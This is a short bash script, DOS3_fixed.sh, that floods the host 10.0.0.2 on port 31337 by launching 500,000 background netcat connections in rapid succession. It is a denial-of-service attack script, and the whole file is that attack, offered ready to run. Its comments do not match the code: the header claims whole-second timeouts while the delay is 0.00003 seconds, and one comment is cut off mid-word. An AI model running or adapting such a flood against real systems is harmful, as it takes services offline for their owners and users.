#!/bin/bash
# DOS3_fixed.sh - Uses whole-second timeouts
for i in {1..500000}; do
  nc -v 10.0.0.2 31337 &
  echo "connection number: $i"
  sleep 0.00003  # Short delay between lau
done
wait
